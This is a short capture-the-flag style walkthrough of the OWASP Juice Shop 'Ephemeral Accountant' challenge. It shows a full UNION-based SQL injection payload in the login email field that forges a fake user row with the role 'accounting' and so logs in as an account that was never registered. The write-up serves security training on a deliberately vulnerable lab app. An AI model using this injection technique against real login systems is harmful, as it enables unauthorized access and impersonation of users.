# No. 6 - Ephemeral Accountant
---
### Objective: Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.
---
### Method: SQL Injection
---

### Step 1: Finding vulnerability in login
Try login and capture the payload
<img width="1918" height="1016" alt="image" src="https://github.com/user-attachments/assets/bc05c9a4-6fe3-4e51-bd1c-45074d98e965" />

### Step 2: Making payload
The payload is:

`
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "123456789"
}
`

This is a sophisticated SQL Injection attack. Its purpose is not just to bypass a login, but to forge an entire user row directly within the database query. Instead of guessing existing data, this payload creates a fake user account with specific, predetermined details. The system then accepts this fabricated data as a valid entry, allowing you to log in as if you were the legitimate user.
<img width="1917" height="1014" alt="image" src="https://github.com/user-attachments/assets/c99d395a-877b-414b-b8de-ea74736c831c" />

### Step 3: Result
We login as unregistered ID
<img width="1918" height="1018" alt="image" src="https://github.com/user-attachments/assets/e1e95065-b6b7-44a4-83c5-2af504866b14" />


